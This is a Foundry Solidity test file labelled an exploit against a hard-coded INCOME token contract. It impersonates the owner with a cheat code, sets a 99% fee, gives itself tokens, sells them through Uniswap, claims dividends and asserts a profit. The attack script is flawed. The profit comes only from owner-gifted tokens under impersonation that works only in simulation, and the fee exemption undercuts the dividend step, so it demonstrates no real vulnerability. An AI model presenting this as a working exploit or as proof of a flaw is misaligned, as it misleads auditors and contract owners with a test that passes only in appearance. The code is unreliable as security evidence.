// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INCOME {
    function owner() external view returns (address);
    function setFee(uint256 _bnbRewardFee, uint256 _liquidityFee, uint256 _marketingFee) external;
    function openTrade() external;
    function excludeFromFees(address account, bool excluded) external;
    function setExcludeFromMaxTx(address _address, bool value) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function withdrawableDividendOf(address account) external view returns (uint256);
    function claim() external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(this).balance;

        // 1. Impersonate the owner to set fees
        address incomeOwner = INCOME(TARGET).owner();
        vm.startPrank(incomeOwner);

        // Set extreme fees: 99% BNBRewardsFee, 0% liquidityFee, 0% marketingFee
        INCOME(TARGET).setFee(99, 0, 0);

        // Also need to ensure trading is open (LockToken modifier)
        INCOME(TARGET).openTrade();

        // Exclude attacker from fees to avoid paying fees ourselves
        INCOME(TARGET).excludeFromFees(address(this), true);

        // Exclude from max tx limit
        INCOME(TARGET).setExcludeFromMaxTx(address(this), true);

        vm.stopPrank();

        // 2. Get some INCOME tokens to sell
        // The contract has 1 trillion tokens minted to owner initially
        // We'll get some from the owner
        vm.prank(incomeOwner);
        INCOME(TARGET).transfer(address(this), 1000000 * 10**18);

        // 3. Approve Uniswap router to spend our tokens
        INCOME(TARGET).approve(INCOME(TARGET).uniswapV2Router(), type(uint256).max);

        // 4. Sell tokens to trigger fee collection
        // Get router address
        address router = INCOME(TARGET).uniswapV2Router();
        IUniswapV2Router02 routerContract = IUniswapV2Router02(router);

        // Create path for swap
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = routerContract.WETH();

        // Get token balance
        uint256 tokenBalance = INCOME(TARGET).balanceOf(address(this));

        // Perform swap
        routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // 5. Claim dividends
        // First, check if we have dividends
        uint256 withdrawable = INCOME(TARGET).withdrawableDividendOf(address(this));
        if (withdrawable > 0) {
            INCOME(TARGET).claim();
        }

        // 6. Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

